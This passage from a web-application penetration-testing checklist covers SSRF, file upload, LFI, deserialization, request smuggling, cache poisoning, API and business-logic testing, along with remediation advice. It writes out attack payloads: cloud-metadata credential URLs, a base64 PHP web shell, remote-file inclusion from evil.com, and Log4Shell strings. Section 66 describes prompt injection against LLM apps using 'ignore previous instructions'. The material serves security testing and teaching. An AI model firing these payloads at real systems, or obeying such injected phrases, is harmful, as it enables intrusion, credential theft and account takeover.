- **Remediation:** rotate on auth/privilege change, server-side invalidation, `HttpOnly; Secure; SameSite`, scoped/prefixed cookies, idle+absolute timeouts, high-entropy tokens.

### 52. Forgot / Reset Password

- **Token weaknesses:** predictable/sequential/short tokens, no expiry, reusable after use, not invalidated after password change or after a new request, leaked in `Referer` to third parties.
- **Host-header / referer poisoning:** reset link built from `Host`/`X-Forwarded-Host` → attacker-domain link leaks token (chain §23 → ATO).
- **IDOR / user-binding flaws:** change `user_id`/`email` in the reset request to reset **another** user's password; token not bound to the requested account.
- **Account enumeration** via reset responses/timing.
- **OTP-based reset:** brute the code (§47), reuse, no rate limit.
- **Logic flaws:** reset doesn't require knowing the token (set new password directly), or the "verify token" and "set password" steps are decoupled (skip verification), or response leaks the token.
- **No re-auth / no notification:** silent takeover; old sessions not killed after reset.
- **Remediation:** high-entropy single-use short-TTL tokens bound to the account, build links from server config not `Host`, invalidate sessions + notify on reset, rate limit, no enumeration.

### 53. Registration & Account Provisioning

- **Mass assignment of role/verified** (§44); registration over HTTP; duplicate/overwrite existing accounts by tampering the request; username collision/normalization (unicode/case → `Admin` vs `admin`, trailing space, `admin@target.com` vs `admin @target.com`).
- **Email verification bypass:** use the account before verifying; change email post-verification without re-verifying; verification token predictable/reusable; pre-verify via response tampering.
- **Disposable/plus-addressing abuse** for unlimited free trials/referrals.
- **Remediation:** enforce verification before privileged use, canonicalize identifiers, server-controlled role/verified flags, reject duplicates atomically.

### 54. Account Takeover (ATO) - Chaining Bugs Together

ATO is rarely a single bug - it's the *outcome* of chaining the above. Always push a "low"-rated auth issue toward full account takeover to maximize impact and payout.

- **Email-change IDOR (no re-auth)** → change victim's email → password reset → ATO.
- **Host-header / referer reset poisoning** (§23 + §52) → token leak → ATO.
- **Open redirect → OAuth `code`/token theft** (§37 + §48) → ATO.
- **Self-XSS + login-CSRF / cookie injection** → turns un-exploitable self-XSS into a real XSS → session theft → ATO.
- **Response-manipulation 2FA bypass** (§47) → ATO behind MFA.
- **CORS misconfig (§10) reading the CSRF token** → forge state-changing requests → email change → ATO.
- **Pre-account-takeover** (§48) - register victim's email before they sign up via SSO.
- **JWT alg confusion / weak secret** (§50) → forge `sub`/`role` → impersonate any user.

**Approach:** for every primitive you find, ask "what does this unlock when combined with X?" Document the full chain in the report - graders pay for demonstrated end-to-end impact, not theoretical building blocks.

---

## Part IX - Server-Side Request Forgery (SSRF)

### 55. SSRF

Make the server issue attacker-controlled requests → reach internal services, cloud metadata, and (blind) internal scanning.

- **Where it hides:** URL/import/preview/webhook/PDF-render/SVG/avatar-from-URL/"fetch image from URL"/SSO metadata URL/proxy params; XML (XXE→SSRF, §18); file-format parsers; any feature that takes a URL or hostname.
- **Common parameters:** `url`, `uri`, `path`, `dest`, `destination`, `redirect`, `continue`, `next`, `data`, `reference`, `site`, `html`, `domain`, `callback`, `feed`, `host`, `port`, `to`, `out`, `view`, `dir`, `show`, `open`, `file`, `page`, `load`, `image`, `img`, `source`, `target`, `proxy`, `fetch`, `webhook`.
- **Confirm:** point at your **Collaborator/`interactsh`** host - DNS+HTTP hit confirms even blind SSRF. Then pivot to internal targets.
- **High-value internal targets:**
  - **Cloud metadata (IMDS):**
    - AWS: `http://169.254.169.254/latest/meta-data/` and `.../iam/security-credentials/<role>` (steal temp creds). For IMDSv2 you need the token header (`X-aws-ec2-metadata-token`) - test whether the SSRF lets you set request headers.
    - GCP: `http://metadata.google.internal/computeMetadata/v1/` (needs `Metadata-Flavor: Google`).
    - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs `Metadata: true`).
    - Alibaba / DigitalOcean / Oracle have their own `169.254.169.254` paths.
  - Internal admin panels, `localhost` services, Redis/Memcached/Elasticsearch, Kubernetes API (`https://kubernetes.default`), Docker socket, internal `/metrics`/`/actuator`.
- **Protocol smuggling:** `file://` (read files), `gopher://` (craft arbitrary TCP - Redis/SMTP/MySQL payloads → RCE/spam), `dict://`, `ftp://`, `ldap://`, `http(s)://`.
- **Filter / SSRF-defense bypass table:**

| Technique | Examples |
| --- | --- |
| Alternate localhost | `127.0.0.1`, `127.1`, `0`, `0.0.0.0`, `[::1]`, `localhost`, any `127.0.0.0/8` |
| IP encoding | Decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`, mixed |
| IPv6 / IPv4-mapped | `[::ffff:127.0.0.1]`, `[::]`, `[0:0:0:0:0:ffff:169.254.169.254]` |
| DNS rebinding | A record flips to internal IP after the allowlist check (TOCTOU) |
| Redirect-based | Allowlisted URL `302`→internal (server follows redirects) |
| Domain tricks | `target.com.evil.com`, `evil.com#@target.com`, `target.com@169.254.169.254`, userinfo abuse |
| Encoding | URL/double-URL encode, unicode dots, enclosed-alphanumerics, `%00`, CRLF |
| DNS to internal | Attacker domain whose `A` record points at `169.254.169.254` |

- **Impact escalation:** read cloud creds → assume role; gopher→Redis→webshell; internal API → data; port scan → internal map.
- **Tools:** Burp Collaborator, `interactsh`, `SSRFmap`, `Gopherus` (gopher payloads), `nuclei -t http/ssrf/`.
- **Remediation:** allowlist outbound hosts/schemes/ports; resolve+pin DNS and re-validate after resolution (block DNS rebinding); block link-local/private ranges; drop redirects; require IMDSv2; no raw protocols.

---

## Part X - File Handling Vulnerabilities

### 56. File Upload

Goal: get a file that executes, controls a path, or carries a payload to whoever views it.

- **RCE via executable upload (bypass extension/MIME/content checks):**

| Bypass | Example |
| --- | --- |
| Double extension | `shell.php.jpg`, `shell.jpg.php` |
| Alt/exotic extensions | `.phtml .php3 .php4 .php5 .php7 .pht .phar` (PHP); `.asp .aspx .ascx .asmx .cer .config` (IIS); `.jsp .jspx .jsw` (Java) |
| Case | `.pHp`, `.PHP` |
| Null byte (legacy) | `shell.php%00.jpg`, `shell.php\x00.jpg` |
| Trailing chars | `shell.php.....`, `shell.php ` (space), `shell.php::$DATA` (NTFS ADS), `shell.php/`, `shell.php%20` |
| RTLO | `shell<U+202E>gpj.php` displays as `shellphp.jpg` |
| MIME spoof | `Content-Type: image/png` with a PHP body |
| Magic bytes | Prepend `GIF89a;` / a valid image header before `<?php ...` |
| Polyglot | Valid image **and** valid PHP/HTML (PHAR-JPEG, GIFAR) |

- **`.htaccess` / `web.config` upload** - map a new extension to the PHP/ASP handler (`AddType application/x-httpd-php .xyz`) then upload `shell.xyz`.
- **Path control:** filename traversal (`../../var/www/html/shell.php`), absolute paths, overwrite existing files (`.htaccess`, app files), **zip-slip** (archive entries with `../`) on extraction, symlink-in-zip → arbitrary file read.
- **Non-RCE impacts (still report):**
  - **Stored XSS** via SVG (`<svg><script>`), HTML served inline, or XSS in the **filename** (`"><img src=x onerror=alert(1)>.jpg`).
  - **XXE** via SVG/DOCX/XLSX (§18).
  - **SSRF** via SVG `<image href="http://169.254.169.254/...">` or server-side image fetch/conversion.
  - **DoS** (decompression bomb, pixel flood, huge file), **ImageTragick/Ghostscript** RCE in image processors, **filename SQLi**.
  - **Content-type confusion** → file served as HTML/JS without `nosniff`; **CDN cache poisoning** via uploaded paths.
- **Also check:** where the file lands (web-accessible? predictable URL? separate sandbox origin?), and whether the response leaks the stored path.
- **Tools:** `Fuxploider`, Burp Intruder/Repeater, `exiftool` (embed payloads in metadata), zip-slip/`evilarc` generators.
- **Remediation:** validate by content (magic bytes) **and** re-encode images; allowlist extensions; randomize stored names; store outside the webroot / on a sandboxed domain; `Content-Type` + `Content-Disposition: attachment` + `nosniff`; disable execution in upload dirs; scan archives safely.

### 57. File Inclusion & Path Traversal

#### Directory / Path Traversal

- **Goal:** read/write files outside the intended directory.
- **Payloads:** `../../../../etc/passwd`, `..\..\..\windows\win.ini`, absolute `/etc/passwd`.
- **Bypass table:**

| Technique | Example |
| --- | --- |
| URL encoding | `%2e%2e%2f`, double `%252e%252e%252f` |
| Unicode/overlong UTF-8 | `%c0%ae%c0%ae/`, `%u002e` |
| Nested/stripped | `....//`, `..../`, `..;/`, `.../...//` (defeats a naive `../`-strip filter) |
| Mixed slashes | `..\/`, `/.\./` |
| Null byte (legacy) | `../../etc/passwd%00.png` |
| Required prefix/suffix | start with a valid dir (`images/../../etc/passwd`), append `%00` or extra path |
| UNC (Windows) | `\\attacker\share` |

- **Common params:** `file`, `page`, `path`, `dir`, `folder`, `doc`, `document`, `template`, `pg`, `style`, `view`, `download`, `name`, `lang`, `include`.

#### Local File Inclusion (LFI) → RCE

- **Read sensitive files:** `/etc/passwd`, `/etc/shadow`, app config, SSH keys, `/proc/self/environ`, `/proc/self/cmdline`, web-server config & logs.
- **PHP wrappers / filters:**
  - Source disclosure: `php://filter/convert.base64-encode/resource=config.php`.
  - **`php://filter` chain to RCE** (the modern technique) - `convert.iconv` filter chains synthesize arbitrary bytes → drop a payload without an upload (`php_filter_chain_generator`).
  - Data wrapper: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`.
  - `expect://id`, `phar://` (deserialization, §58), `zip://`, `php://input` (POST body as code).
- **LFI→RCE techniques:**
  - **Log poisoning:** inject PHP into `User-Agent`/`Referer` → include `/var/log/apache2/access.log` (or nginx, mail, SSH `auth.log`).
  - **`/proc/self/environ`** poisoning via `User-Agent`.
  - **Session file inclusion** (`/var/lib/php/sessions/sess_<id>`) after planting code in a session value.
  - **PHP filter-chain / `phar://` / upload-then-include** race conditions.
- **Remote File Inclusion (RFI):** include an attacker URL (`?page=http://evil.com/shell.txt`) when `allow_url_include` is on → direct RCE; truncate appended extensions with `?`/`#`.
- **Tools:** `LFISuite`, `kadimus`, `liffy`, `php_filter_chain_generator`, Burp.
- **Remediation:** never pass user input to file APIs; allowlist permitted files (map keys→paths); disable URL inclusion & dangerous wrappers; canonicalize and confine to a base dir; least-privilege FS perms.

---

## Part XI - Insecure Deserialization

### 58. Insecure Deserialization

Untrusted serialized data is deserialized → object injection, property tampering, and (via gadget chains) RCE.

- **Spot serialized data:** cookies/params/hidden fields/storage that base64-decode to a recognizable format:
  - **PHP:** `O:4:"User":2:{...}` (object injection / POP chains).
  - **Java:** base64 starting `rO0AB...` (`0xac 0xed` magic), `Content-Type: application/x-java-serialized-object`.
  - **.NET:** `BinaryFormatter`/`ObjectStateFormatter`/`LosFormatter`/`Json.NET` `TypeNameHandling`; ViewState (`__VIEWSTATE`).
  - **Python:** `pickle` (base64), `PyYAML` `yaml.load`, `jsonpickle`.
  - **Ruby:** `Marshal`, YAML (`Psych`), Oj.
  - **Node.js:** `node-serialize` (`_$$ND_FUNC$$_`), `serialize-javascript`, `funcster`.
- **Attacks:**
  - **Property/object tampering:** flip `isAdmin`/`role`/`price`, type-juggle, trigger magic-method side effects (PHP `__wakeup`/`__destruct`, Java `readObject`).
  - **Gadget-chain RCE:** chain classes already on the classpath to reach code execution.
- **Tooling per language:**
  - Java: **`ysoserial`** (CommonsCollections, Spring…), `marshalsec`, Java Deserialization Scanner (Burp).
  - PHP: **`phpggc`** (Laravel/Symfony/Monolog/Guzzle chains); **PHAR** deserialization via file ops on `phar://` (no `unserialize()` call needed).
  - .NET: **`ysoserial.net`** (`TypeConfuseDelegate`…); ViewState attacks (need `machineKey` / `__VIEWSTATEGENERATOR`).
  - Python: craft `__reduce__` pickle payloads; `!!python/object/apply` YAML.
  - Ruby: universal gadget chains for Marshal/YAML.
- **Tools:** the above + Burp's deserialization scanner + Collaborator for blind/RCE confirmation.
- **Remediation:** don't deserialize untrusted data; prefer data-only formats (JSON) with strict schemas; if unavoidable, sign/encrypt blobs (HMAC), allowlist classes/types, disable polymorphic type handling (`TypeNameHandling.None`), keep libraries patched.

---

## Part XII - Modern & Advanced Server-Side Attacks

These are the categories most often missing from older checklists - and where a lot of high-severity bug-bounty payouts now live.

### 59. HTTP Request Smuggling / Desync

When a front-end (proxy/CDN/load balancer) and back-end disagree on where one request ends and the next begins, you can "smuggle" a partial request that prefixes the next user's request → bypass front-end controls, capture other users' requests, mass-poison responses, and escalate to mass ATO.

- **Core variants:**
  - **CL.TE** - front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.
  - **TE.CL** - the reverse.
  - **TE.TE** - both support TE but one is tricked by an obfuscated header (`Transfer-Encoding : chunked`, `Transfer-Encoding: xchunked`, duplicate TE, tab/space tricks, `\n` vs `\r\n`).
  - **CL.0** - back-end ignores `Content-Length` on certain endpoints.
  - **H2.CL / H2.TE** - HTTP/2 downgrade desync (request-line/header injection during h2→h1 translation); **H2.0**, and HTTP/2 request splitting/tunnelling.
- **Detection:** use **Burp's HTTP Request Smuggler** extension (timing-based + differential probes) and `smuggler.py`. Confirm carefully with timing before attempting exploit (avoid harming other users).
- **Impacts:** bypass front-end auth/WAF, capture victims' requests (steal session cookies/tokens), web cache poisoning at scale, response queue poisoning, credential harvesting, forced ATO.
- **Caution:** smuggling can affect *other real users' traffic*. Test against your own requests, throttle, and follow program rules; many programs require explicit permission.
- **Remediation:** use HTTP/2 end-to-end (no downgrade), reject ambiguous/conflicting `CL`+`TE`, normalize/validate headers at the edge, disable connection reuse to the back-end where feasible.

### 60. Web Cache Poisoning

Get a malicious response cached and served to other users.

- **Method:**
  1. Identify **unkeyed inputs** (headers/params not part of the cache key but reflected in the response) - `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-For`, custom headers, certain query params. **Param Miner** automates discovery.
  2. Find a gadget: the unkeyed input is reflected into the response (a script `src`, a link, an open redirect, an XSS sink).
  3. Poison: send a request with a cacheable path + your malicious unkeyed input; confirm the response is cached (`X-Cache: hit`, `Age`, `Cache-Control`) and served to others.
- **Examples:** unkeyed `X-Forwarded-Host` → poisoned `<script src="//evil.com/x.js">` → stored-XSS-like mass impact; cache-key normalization quirks; **cache-key injection**; **fat GET** (body on GET); **parameter cloaking** (HPP + cache).
- **DoS variant (CPDoS):** poison with an oversized/erroring response so the cache serves errors to everyone.
- **Tools:** Param Miner, Burp, `Web Cache Vulnerability Scanner (WCVS)`.
- **Remediation:** include all influential inputs in the cache key (or strip them), don't reflect unkeyed headers, set correct `Cache-Control`/`Vary`, separate caches for authenticated content.

### 61. Web Cache Deception

Trick the cache into storing a victim's **private, authenticated** response under a public URL the attacker can then fetch.

- **Method:** request a sensitive authenticated page with an appended static-looking suffix the cache caches by extension but the app still serves dynamically: `/account` → `/account/nonexistent.css` (or `.js`, `.jpg`, `;.css`, `%0a.css`, `?.css`). If the app ignores the suffix and the cache stores it as static, the attacker requests the same URL and gets the victim's cached PII/tokens.
- **Test:** path-confusion + extension/delimiter tricks; check `X-Cache`/`Age` on the crafted URL while authenticated, then re-fetch unauthenticated.
- **Remediation:** cache only by content-type from origin (not URL extension), `Cache-Control: private/no-store` on authenticated responses, strict path matching, don't cache responses with `Set-Cookie`.

### 62. Race Conditions

Concurrent requests hitting a non-atomic check-then-act window (TOCTOU) → limit-overrun, double-spend, and state-machine corruption.

- **Classic targets:** redeem a coupon/gift card/voucher more than once, withdraw/transfer the same balance twice, bypass "one per account" limits, over-draft, multi-use of a single-use token/OTP, vote/like/follow inflation, beat a rate limit, race a 2FA/email-verification check, racing object creation to bypass uniqueness.
- **Technique:** send N identical requests **in parallel** in the same instant.
  - **Single-packet attack** (HTTP/2) - send 20–30 requests in one TCP packet to eliminate network jitter; built into **Burp Repeater "Send group in parallel"** and **Turbo Intruder** (`engine=Engine.BURP2`, `gate`).
  - HTTP/1: last-byte synchronization.
- **Sub-types:** limit-overrun, multi-endpoint races (two different endpoints sharing state), single-endpoint races, partial-construction (use an object mid-creation), time-sensitive token collisions.
- **Confirm:** a side effect happened more times than the logic should allow (2 redemptions, balance went negative, 2 accounts with the same unique email).
- **Tools:** Turbo Intruder, Burp Repeater parallel groups, `race-the-web`.
- **Remediation:** atomic operations / DB transactions with row locks (`SELECT ... FOR UPDATE`), unique constraints, idempotency keys, mutexes/semaphores, rate limits that are themselves atomic.

### 63. Server-Side Prototype Pollution (Node.js)

- **What it is:** polluting `Object.prototype` server-side (via recursive merge of JSON input, `Object.assign`, `lodash.merge`, query parsers) → DoS, property injection, privilege bypass (inject `isAdmin`), and sometimes **RCE** (gadget chains reaching `child_process` via templating, or polluting options passed to `exec`/spawn).
- **Test:** send JSON with `"__proto__":{"polluted":"x"}` or `"constructor":{"prototype":{"polluted":"x"}}`; detect via a reflected property, a status-code change, or a known gadget (PortSwigger's server-side PP techniques use response differences and `Object.prototype` option-injection gadgets).
- **Remediation:** block `__proto__`/`constructor`/`prototype` keys, `Object.create(null)` maps, schema validation (JSON Schema), `--disable-proto=delete` Node flag, `Object.freeze(Object.prototype)`.

### 64. GraphQL Security

- **Introspection** - if enabled (`__schema`, `__type`), dump the full schema → discover hidden queries/mutations, types, and fields. Test even if the GraphiQL UI is off (introspection query may still work; or use field-suggestion/`clairvoyance` to reconstruct a disabled schema).
- **Authorization flaws (very common):** missing object/field-level authz → IDOR/BOLA via `node(id:)`, querying other users' objects, accessing admin-only fields/mutations; inconsistent authz between REST and GraphQL for the same data.
- **Batching attacks:** send many operations/aliases in one request to **bypass rate limits** (brute-force OTP/login via aliased mutations), or **DoS** via deeply nested/recursive queries (query depth/complexity bombs, circular fragments).
- **Injection:** SQLi/NoSQLi/command injection through resolver arguments; SSRF via URL arguments.
- **Other:** CSRF on GraphQL (if it accepts `GET` or form-content-type), mass assignment via input objects, verbose errors leaking internals, disabling/`@skip`/`@include` directive abuse.
- **Tools:** `graphql-cop`, `clairvoyance`, `InQL` (Burp), `graphw00f` (engine fingerprint), GraphQL Voyager (visualize schema), Altair/GraphiQL.
- **Remediation:** disable introspection in prod, per-field/object authorization, query depth/complexity limits + cost analysis, disable batching or rate-limit per-operation, persisted queries, no verbose errors.

### 65. REST/API Security - OWASP API Top 10

APIs are often the richest, least-tested surface. Walk the OWASP API Security Top 10 (2023):

- **API1 - BOLA (object-level authz):** the IDOR family (§41) - the #1 API bug. Swap object IDs across users/tenants.
- **API2 - Broken Authentication:** weak/again-the-same JWT issues (§50), tokens that don't expire, credential stuffing, weak API keys, key in URL.
- **API3 - Broken Object Property Level Authz:** mass assignment (§44) **+** **excessive data exposure** (the API returns more fields than the UI shows - read the raw JSON for PII, internal flags, other users' data; the client filters, the server shouldn't).
- **API4 - Unrestricted Resource Consumption:** no rate limiting/quotas → brute force, enumeration, cost/DoS; large page sizes, expensive queries.
- **API5 - BFLA (function-level authz):** §43 - call admin/privileged operations as a low-priv user; guess `POST/PUT/DELETE` on objects you can only `GET`.
- **API6 - Unrestricted Access to Sensitive Business Flows:** automation abuse (bulk-buy, scalping, spam) without bot/anti-automation controls.
- **API7 - SSRF:** §55 - APIs that fetch user-supplied URLs (webhooks, importers).
- **API8 - Security Misconfiguration:** verbose errors, missing headers, permissive CORS, unpatched components, debug endpoints, `OPTIONS` leakage.
- **API9 - Improper Inventory Management:** **shadow/zombie APIs** - old versions (`/v1` while `/v3` is current), staging/dev hosts, undocumented endpoints (find via JS, swagger, history, version-bumping the path). Old versions often skip new authz.
- **API10 - Unsafe Consumption of 3rd-Party APIs:** trusting upstream API data/redirects without validation.
- **Also test:** mass assignment, JWT attacks, GraphQL (§64), content-type juggling (`application/json` vs form), HTTP method override, pagination/`limit` abuse, and **API versioning differentials** (auth enforced on one version, not another).
- **Tools:** Postman/Insomnia, Burp, `kiterunner` (API route brute-force), `arjun` (params), swagger/openapi parsing, `nuclei` API templates.
- **Remediation:** centralized, object- and function-level authz checks; explicit output DTOs; rate limits/quotas; retire old versions; schema validation; full API inventory.

### 66. Web LLM / AI Feature Attacks

If the app embeds an LLM (chatbot, "AI assistant", summarizer, agent with tools), test the AI-specific surface (OWASP LLM Top 10 / emerging ASI agentic risks).

- **Prompt injection (direct):** override the system prompt / instructions ("ignore previous instructions…", role-play jailbreaks) → make it leak the system prompt, reveal other users' data, or perform unintended actions.
- **Indirect prompt injection:** malicious instructions hidden in content the LLM ingests (a web page it browses, a document it summarizes, an email, a support ticket, image alt-text, even **ASCII-smuggled/unicode-tag** invisible text) → the model executes the attacker's instructions when processing victim/automated content.
- **Sensitive info disclosure:** system-prompt extraction, training-data/secret leakage, other tenants' data via shared context.
- **Excessive agency / tool abuse:** if the LLM can call tools (DB queries, HTTP requests, code exec, send email), test for **IDOR via the chatbot** (ask it to fetch *another* user's order), **SSRF** (ask it to fetch an internal URL), **SQLi** through its DB tool, and **RCE** through a code/`exec` tool.
- **Insecure output handling:** the model's output is rendered as HTML/markdown → **XSS** (`<img src=x onerror=...>` in a model reply), or used in a downstream `eval`/shell → injection.
- **Other:** denial-of-wallet (expensive prompts), guardrail/safety bypass leading to policy-violating output that harms the brand, model-supplied links → open redirect/phishing.
- **Approach:** treat the LLM as both a *target* (jailbreak/extract) and a *confused-deputy proxy* to the backend (every tool it can call is an attack surface you reach through natural language).
- **Remediation:** treat all model I/O as untrusted; sandbox & least-privilege tools with their own authz (don't let the model bypass object-level checks); output-encode model responses; input/output filtering; per-user data isolation; human approval for high-impact tool actions.

---

## Part XIII - Denial of Service (Application Layer)

### 67. DoS

> Only test DoS with **explicit written permission** - most bug bounty programs forbid it and want a theoretical writeup instead.

- **No rate limiting → resource exhaustion / abuse:** flood forgot-password / OTP / signup / search; amplification via expensive endpoints.
- **Algorithmic complexity:** **ReDoS** (catastrophic-backtracking regex on user input), hash-collision DoS, unbounded sorting/pagination, GraphQL query bombs (§64), nested JSON/XML.
- **Memory/CPU bombs:** **XML billion-laughs** (§18), zip/gzip decompression bombs, oversized uploads, pixel-flood images, deeply nested JSON.
- **Long-input DoS:** unbounded password/field length hitting an expensive hash (bcrypt on a 1 MB password), `printf`-style or template expansion.
- **Cookie bomb / header bloat:** force huge cookies/headers so the server/proxy rejects the victim (client-side DoS).
- **Cache-poisoned DoS (CPDoS):** §60.
- **Account-lockout-as-DoS:** trigger lockout on a victim's account by failing logins (availability impact on the victim).
- **Remediation:** rate limiting/quotas, input size caps, safe regex (linear engines / timeouts), decompression limits, complexity limits, bounded resource use, cap password length before hashing.

---

## Part XIV - Vertical / Business-Logic Test Cases

Domain-specific abuse cases for common app types. These are concrete instances of §45 (business logic) and §41 (access control) - they pay because they require understanding the *business*, which scanners can't.

### 68. E-commerce

- **Order management:** tamper price/quantity/currency after placement; negative quantity → credit; modify total/`amount`/`shipping` to `0` or negative; apply discounts post-checkout; manipulate the order `status` to "paid/shipped".
- **Payment gateway:** intercept the client→gateway and gateway→app callback; tamper `amount`/`status`/`signature`; bypass/forge the integrity checksum; replay a successful-payment callback; change currency to a cheaper one; race the confirmation (§62).
- **Coupons / rewards / loyalty:** reuse a single-use coupon (race or after cancel), stack non-stackable coupons, predict coupon codes (brute, Intruder), apply a coupon to ineligible items, negative-value abuse, refund-then-keep.
- **Refunds / cancellations:** get a refund without returning goods; cancel after fulfillment but keep credit; refund to a different account.
- **Cart / wishlist:** view/modify another user's cart (IDOR), add out-of-stock/restricted items, manipulate cart-stored price.
- **Inventory / scalping:** bulk-reserve/hold inventory (§API6), bypass per-user purchase limits (race).

### 69. Banking / Fintech

- **Statements/billing:** view/modify another customer's statement (IDOR §41).
- **Accounts (deposit/loan/FD):** tamper balances/amounts/interest; open accounts for others; exceed balance; manipulate maturity/tenure.
- **Fund transfer / NEFT / scheduled:** change payee/recipient/amount; view or alter others' scheduled transfers (IDOR); transfer more than balance (race/logic); bypass transaction limits; manipulate beneficiary verification.
- **Tax / charges:** tamper tax rates, fees, or refund amounts.
- **Cheque / payment instructions:** request/stop payments for other accounts (IDOR), tamper cheque numbers/dates.
- **Status enquiry:** view/modify others' transaction status (IDOR).
- **General:** rounding/decimal abuse, currency confusion, negative amounts, replay of signed transaction requests, MFA/transaction-signing bypass.

### 70. Travel / Booking (Flight / Rail / Hotel)

- View, modify, cancel, or **refund another user's booking** by guessing PNR/booking/ticket reference (brute predictable prefixes with Intruder).
- Upgrade class (economy→business) by tampering fare/class params; change passenger/traveler details on others' bookings.
- Manipulate price/fare/taxes/fees; apply expired promo fares; book beyond capacity; hold inventory to deny others (§API6).
- Bypass payment on hold-and-confirm flows; cancel-and-rebook for free changes.

### 71. Product Purchase Flow

- **Buy now / checkout:** tamper product ID, price, quantity, variant; substitute a cheaper SKU's price onto an expensive product.
- **Gift cards / vouchers:** reuse, predict, or re-redeem codes; tamper value/balance; race redemption (§62).
- **Address / shipping:** change another user's address (IDOR), stored XSS in address fields, ship to a different address than the verified one.
- **Place order:** cleartext/loggable CVV or card data, missing server-side total recompute, skip the payment step.
- **Track / post-purchase:** guess tracking numbers (IDOR), cancel/return others' orders, manipulate review/rating systems.

---

## Part XV - Known Vulnerabilities, CMS & Components

### 72. CMS, Frameworks & Known-CVE Testing

- **Identify** the CMS/framework + version (Part II) then map to known CVEs.
- **WordPress:** `wpscan --url target --enumerate vp,vt,u,ap` (vulnerable plugins/themes, users, all plugins). Check `xmlrpc.php` (brute-force amplification, pingback SSRF/DoS), `wp-json/wp/v2/users` (user enum), `wp-config.php`/backups, `/wp-content/uploads/` listings, `load-scripts.php`/`load-styles.php` DoS (CVE-2018-6389), author-archive enumeration, REST API leaks.
- **Drupal:** Drupalgeddon (CVE-2018-7600 / -7602) RCE; `droopescan`.
- **Joomla:** `joomscan`; com_* component CVEs.
- **Other components:** Spring (Spring4Shell CVE-2022-22965, actuator exposure), Apache Struts (OGNL RCE), Jenkins, GitLab, Atlassian Confluence/Jira (OGNL/template RCE), Telerik UI, Citrix, F5 BIG-IP, MOVEit, Log4Shell (CVE-2021-44228 - test `${jndi:ldap://<collab>/x}` in headers/inputs/UA).
- **Dependency / SCA:** flag known-vulnerable JS libs (Retire.js), outdated server software, exposed package manifests (`package.json`, `composer.lock`, `Gemfile.lock`) → map to advisories.
- **Tools:** `nuclei` (huge CVE template library - `nuclei -t http/cves/`), `wpscan`, `nmap` NSE vuln scripts, `searchsploit`, Wappalyzer→CVE pivots, `log4j-scan`.
- **Remediation:** patch management, SCA in CI, virtual patching/WAF as stopgap, remove unused plugins/components.

---

## Part XVI - Reporting & Resources

### 73. Reporting

A finding is only as valuable as its report. Make it reproducible and impact-driven.

- **Structure:** Title · Severity (CVSS 3.1 vector + score) · Affected asset/endpoint · Summary · Steps to Reproduce (exact requests/responses, numbered) · Proof of Concept (payload/screenshots/video) · Impact (concrete business consequence) · Remediation · References (CWE, OWASP, CVE).
- **Severity:** use CVSS 3.1 (`AV/AC/PR/UI/S/C/I/A`); for bug bounty, map to the platform's taxonomy (Bugcrowd VRT, HackerOne CWE). Don't inflate - graders downgrade overclaims.
- **Prove impact, don't speculate.** Show the actual stolen data / executed command / taken-over account. Avoid "could potentially" - demonstrate it or chain it until you can. A confirmed `alert(document.domain)` in an admin context beats a paragraph of theory.
- **Quality bar:** minimal reproducible PoC, exact preconditions (which role, which browser, any required state), no destructive testing, redact real victim PII, one issue per report.
- **Chain for severity:** combine low-severity primitives (§54) and report the end-to-end chain - that's where the payout is.

### 74. Tools, Burp Extensions & Wordlists

**Recon & enumeration:** `subfinder`, `amass`, `assetfinder`, `dnsx`, `puredns`, `httpx`, `katana`, `gau`, `waybackurls`, `gospider`, `gowitness`, `ffuf`, `feroxbuster`, `gobuster`, `arjun`, `x8`, `paramspider`, `wafw00f`, `whatweb`, `nuclei`.

**Exploitation / scanning:** Burp Suite Pro, OWASP ZAP, `sqlmap`, `NoSQLMap`, `commix`, `tplmap`/`SSTImap`, `dalfox`, `XSStrike`, `Corsy`, `dotdotpwn`, `crlfuzz`, `SSRFmap`, `Gopherus`, `jwt_tool`, `ysoserial`/`ysoserial.net`, `phpggc`, `graphql-cop`, `clairvoyance`, `kiterunner`, `wpscan`, `joomscan`, `droopescan`, `nikto`.

**Secrets / JS:** `trufflehog`, `gitleaks`, `LinkFinder`/`xnLinkFinder`, `SecretFinder`, `getJS`, `sourcemapper`, `git-dumper`.

**Burp extensions (BApp):** Logger++ · Autorize / AuthMatrix / Authz · Param Miner · Turbo Intruder · HTTP Request Smuggler · JWT Editor · SAML Raider · InQL (GraphQL) · Collaborator Everywhere · Active Scan++ · Backslash Powered Scanner · Hackvertor · Retire.js · Software Vulnerability Scanner · J2EEScan · Reflected Parameters · Content Type Converter · 403 Bypasser · CSRF Scanner.

**Wordlists & data:**
- **SecLists** (`github.com/danielmiessler/SecLists`) - the canonical collection (Discovery, Fuzzing, Usernames, Passwords, Payloads).
- **PayloadsAllTheThings** (`github.com/swisskyrepo/PayloadsAllTheThings`) - per-vuln payloads & bypasses.
- Assetnote wordlists (`wordlists.assetnote.io`), `raft-*` lists, `OneListForAll`, fuzzdb, jhaddix `all.txt`/`content_discovery_all.txt`.

**Learning / reference:**
- OWASP **Web Security Testing Guide** (WSTG) - the methodology backbone.
- OWASP **Top 10** (2021) & **API Security Top 10** (2023).
- **PortSwigger Web Security Academy** - free, authoritative labs for nearly every class above.
- **HackTricks**, **HackerOne Hacktivity** / public disclosed reports, **Bug Bounty platform VRTs**.
- MITRE **CWE** & **ATT&CK** for mapping/classification.

---

### Appendix - 60-Second Pre-Engagement Checklist

- [ ] Authorization confirmed; scope (in/out) documented; rate-limit & DoS rules read.
- [ ] Burp scope set; "in-scope only" enabled; CA cert installed.
- [ ] Recon run (subdomains, content, JS, params, tech, WAF).
- [ ] All roles' sessions captured (admin / user A / user B / unauthenticated) for access-control testing.
- [ ] Config review done (headers, TLS, methods, exposed files, CORS).
- [ ] Per-class testing tracked against this checklist; nothing skipped.
- [ ] Findings validated (reproducible, impact proven, severity scored) before reporting.

---

*This checklist is a living document - web security evolves constantly. Keep it updated as new classes (and new bypasses for old ones) emerge. Test ethically, stay in scope, and always prove impact.*
